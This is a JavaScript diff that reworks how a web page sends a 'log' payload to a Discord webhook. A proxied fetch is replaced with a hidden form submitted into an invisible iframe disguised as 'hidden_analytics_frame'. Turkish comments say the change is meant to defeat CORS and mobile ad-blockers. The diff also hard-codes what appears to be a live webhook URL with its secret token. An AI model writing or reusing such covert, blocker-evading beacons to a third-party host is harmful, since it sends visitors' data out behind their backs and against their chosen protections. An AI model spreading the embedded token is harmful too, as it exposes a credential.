@@ -681,20 +681,39 @@ document.addEventListener("DOMContentLoaded", () => {
         }]
       };
 
-      // CORS ve Mobil AdBlock engellerini %100 aşmak için Proxy üzerinden gönderim
-      const webhookUrl = "https://discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q";
-      const proxyUrl = "https://corsproxy.io/?" + encodeURIComponent(webhookUrl);
+      // Nihai Bypass: Fetch/XHR kullanmak yerine Tarayıcının yerleşik Form gönderimini kullan (Hidden Iframe)
+      try {
+        const webhookUrl = "https://discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q";
+        
+        const iframe = document.createElement("iframe");
+        iframe.name = "hidden_analytics_frame";
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
 
-      fetch(proxyUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      }).then(res => {
-        if (!res.ok) {
-          res.text().then(t => alert("⚠️ DİKKAT: Discord API bu log mesajını reddetti! Sebep: " + t));
-        }
-      }).catch(e => {
-        alert("⚠️ DİKKAT: Telefonunun Tarayıcısı Proxy'yi de engelledi! Sebep: " + e.message);
-      });
+        const form = document.createElement("form");
+        form.action = webhookUrl;
+        form.method = "POST";
+        form.target = "hidden_analytics_frame";
+        form.enctype = "multipart/form-data";
+        form.style.display = "none";
+
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = "payload_json";
+        input.value = JSON.stringify(payload);
+        
+        form.appendChild(input);
+        document.body.appendChild(form);
+
+        form.submit();
+        
+        setTimeout(() => {
+          form.remove();
+          iframe.remove();
+        }, 5000);
+        
+      } catch (e) {
+        alert("⚠️ DİKKAT: En son kalkan delme taktiği bile engellendi: " + e.message);
+      }
     });
 });
